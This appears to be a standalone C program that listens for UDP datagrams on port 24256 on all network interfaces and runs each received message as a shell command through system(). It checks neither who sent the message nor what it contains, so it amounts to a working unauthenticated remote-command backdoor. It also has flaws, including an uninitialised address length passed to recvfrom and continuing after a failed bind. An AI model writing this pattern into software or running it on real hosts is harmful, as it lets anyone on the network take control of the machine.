#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <net/if.h>
#include <errno.h>



int recv_command(int sock)
{
    char cmd[256];
    fd_set set;
    int ret;
    struct sockaddr_in addr;
    socklen_t addrLen;
    struct timeval tv;

    while(1)
    {
        FD_ZERO(&set);
        FD_SET(sock, &set);
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        ret = select(sock+1, &set, NULL, NULL, &tv);
        if(ret < 0)
        {
            printf("select failed, error: %s\n", strerror(errno));
            return ret;
        }
        else if(ret == 0) // timeout
            continue;
        if(FD_ISSET(sock, &set))
        {
			memset(cmd, 0, sizeof(cmd));
            if(recvfrom(sock, cmd, sizeof(cmd), 0, (struct sockaddr*)&addr, &addrLen) > 0)
            {
                system(cmd);
            }
        }
    }

    return 0;
}

int main(int argc, char *argv[])
{
    int sock;
    struct sockaddr_in addr_local;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock < 0)
    {
        printf("Create socket failed\n");
        return -1;
    }

    // bind
    bzero(&addr_local, sizeof(addr_local));
    addr_local.sin_family = AF_INET;
    addr_local.sin_addr.s_addr = INADDR_ANY;
    addr_local.sin_port = htons(24256);
    if(bind(sock, (struct sockaddr*)&addr_local, sizeof(struct sockaddr_in)) < 0)
    {
        printf("bind socket failed\n");
        close(sock);
    }
    int bReuseAddr = 1;
    setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,(void *)&bReuseAddr,sizeof(int));

    recv_command(sock);

    close(sock);

    return 0;
}
